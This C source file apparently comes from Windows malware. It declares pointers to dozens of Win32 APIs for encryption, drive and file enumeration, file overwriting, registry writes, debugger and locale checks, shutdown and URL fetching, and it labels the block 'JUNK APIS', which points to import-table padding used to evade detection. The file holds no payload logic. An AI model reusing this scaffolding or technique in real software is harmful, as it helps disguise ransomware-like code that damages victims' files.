#include <Windows.h>
#include <Wincrypt.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <TlHelp32.h>
#include <Wininet.h>


// user32.dll
LPVOID lpvMessageBoxARef = MessageBoxA;
LPVOID lpvMessageBoxWRef = MessageBoxW;
LPVOID lpvGetKeyboardLayout = GetKeyboardLayout;
LPVOID lpvSystemParametersInfoA = SystemParametersInfoA;
LPVOID lpvSystemParametersInfoW = SystemParametersInfoW;
LPVOID lpvwsprintfA = wsprintfA;
LPVOID lpvwsprintfW = wsprintfW;
LPVOID lpvInitateSystemShutdownExA = InitiateSystemShutdownExA;
LPVOID lpvInitateSystemShutdownExW = InitiateSystemShutdownExW;
LPVOID lpvlpstrcmpW = lstrcmpW;
LPVOID lpvOpenProcess = OpenProcess;
// shell32.dll
LPVOID lpvSHGetFolderPathARef = SHGetFolderPathA;
LPVOID lpvSHGetFolderPathWRef = SHGetFolderPathW;

// advapi32.dll
LPVOID lpvCryptAcquireContextARef = CryptAcquireContextA;
LPVOID lpvCryptAcquireContextWRef = CryptAcquireContextW;
LPVOID lpvCryptReleaseContextRef = CryptReleaseContext;
LPVOID lpvCryptGenKeyRef = CryptGenKey;
LPVOID lpvRegDeleteKeyValueARef = RegDeleteKeyValueA;
LPVOID lpvRegDeleteKeyValueWRef = RegDeleteKeyValueW;
LPVOID lpvRegSetValueExARef = RegSetValueExA;
LPVOID lpvRegSetValueExWRef = RegSetValueExW;
LPVOID lpvRegCreateKeyExARef = RegCreateKeyExA;
LPVOID lpvRegCreateKeyExWRef = RegCreateKeyExW;
LPVOID lpvRegCloseKeyRef = RegCloseKey;
LPVOID lpvGetCurrentHwProfileA = GetCurrentHwProfileA;
LPVOID lpvGetCurrentHwProfileW = GetCurrentHwProfileW;
LPVOID lpvCryptDecryptRef = CryptDecrypt;
LPVOID lpvCryptEncryptRef = CryptEncrypt;
LPVOID lpvCryptImportKeyRef = CryptImportKey;
LPVOID lpvCryptExportKeyRef = CryptExportKey;
LPVOID lpvCryptDestroyKeyRef = CryptDestroyKey;

// kernel32.dll
LPVOID lpvCreateFileARef = CreateFileA;
LPVOID lpvCreateFileWRef = CreateFileW;
LPVOID lpvIsDebuggerPresentRef = IsDebuggerPresent;
LPVOID lpvCloseHandleRef = CloseHandle;
LPVOID lpvHeapAllocRef = HeapAlloc;
LPVOID lpvHeapFreeRef = HeapFree;
LPVOID lpvSleepRef = Sleep;
LPVOID lpvTerminateProcessRef = TerminateProcess;
LPVOID lpvGetExitCodeProcessRef = GetExitCodeProcess;
LPVOID lpvGetCurrentThreadRef = GetCurrentThread;
LPVOID lpvGetThreadContextRef = GetThreadContext;
LPVOID lpvOpenProcessRef = OpenProcess;
LPVOID lpvFreeLibraryRef = FreeLibrary;
LPVOID lpvGetModuleFileNameARef = GetModuleFileNameA;
LPVOID lpvGetModuleFileNameWRef = GetModuleFileNameW;
LPVOID lpvGetProcAddressRef = GetProcAddress;
LPVOID lpvLoadLibraryARef = LoadLibraryA;
LPVOID lpvLoadLibraryWRef = LoadLibraryW;
LPVOID lpvCopyFileARef = CopyFileA;
LPVOID lpvCopyFileWRef = CopyFileW;
LPVOID lpvCreateToolhelp32SnapshotRef = CreateToolhelp32Snapshot;
LPVOID lpvProcess32FirstRef = Process32First;
LPVOID lpvProcess32FirstWRef = Process32FirstW;
LPVOID lpvProcess32NextRef = Process32Next;
LPVOID lpvProcess32NextWRef = Process32NextW;
LPVOID lpvGetFileSizeExRef = GetFileSizeEx;
LPVOID lpvReadFileRef = ReadFile;
LPVOID lpvSetEndOfFileRef = SetEndOfFile;
LPVOID lpvSetFilePointerRef = SetFilePointer;
LPVOID lpvSetFilePointerExRef = SetFilePointerEx;
LPVOID lpvWriteFileRef = WriteFile;
LPVOID lpvGetLastErrorRef = GetLastError;
LPVOID lpvGetProcessHeapRef = GetProcessHeap;
LPVOID lpvLocalFreeRef = LocalFree;
LPVOID lpvMoveFileARef = MoveFileA;
LPVOID lpvMoveFileWRef = MoveFileW;
LPVOID lpvHeapReAllocRef = HeapReAlloc;
LPVOID lpvFindCloseRef = FindClose;
LPVOID lpvFindFirstFileARef = FindFirstFileA;
LPVOID lpvFindFirstFileWRef = FindFirstFileW;
LPVOID lpvFindNextFileARef = FindNextFileA;
LPVOID lpvFindNextFileWRef = FindNextFileW;
LPVOID lpvGetLogicalDriveStringsARef = GetLogicalDriveStringsA;
LPVOID lpvGetLogicalDriveStringsWRef = GetLogicalDriveStringsW;
LPVOID lpvlstrcmpARef = lstrcmpA;
LPVOID lpvMultiByteToWideCharRef = MultiByteToWideChar;
LPVOID lpvExitProcessRef = ExitProcess;
LPVOID lpvGetUserDefaultLCIDRef = GetUserDefaultLCID;

LPVOID lpvlstrlenA = lstrlenA;
LPVOID lpvlstrlenW = lstrlenW;
LPVOID lpvCreateProcessA = CreateProcessA;
LPVOID lpvCreateProcessW = CreateProcessW;
LPVOID lpvWaitForSingleObject = WaitForSingleObject;
LPVOID lpvGetModuleFileNameA = GetModuleFileNameA;
LPVOID lpvGetModuleFileNameW = GetModuleFileNameW;
LPVOID lpvRegCreateKeyExA = RegCreateKeyExA;
LPVOID lpvRegCreateKeyExW = RegCreateKeyExW;

// crypt32.dll
LPVOID lpvCryptDecodeObjectExRef = CryptDecodeObjectEx;
LPVOID lpvCryptImportPublicKeyInfoRef = CryptImportPublicKeyInfo;
LPVOID lpvCryptStringToBinaryARef = CryptStringToBinaryA;
LPVOID lpvCryptStringToBinaryWRef = CryptStringToBinaryW;

// shlwapi.dll
LPVOID lpvPathFindExtensionA = PathFindExtensionA;
LPVOID lpvPathFindExtensionW = PathFindExtensionW;

// wininet.dll
LPVOID lpvInternetSetCookieA = InternetSetCookieA;
LPVOID lpvInternetSetCookieW = InternetSetCookieW;
LPVOID lpvInternetReadFile = InternetReadFile;
LPVOID lpvInternetOpenUrlA = InternetOpenUrlA;
LPVOID lpvInternetOpenUrlW = InternetOpenUrlW;
LPVOID lpvInternetCloseHandle = InternetCloseHandle;
LPVOID lpvInternetOpenA = InternetOpenA;
LPVOID lpvInternetOpenW = InternetOpenW;

/*
JUNK APIS*/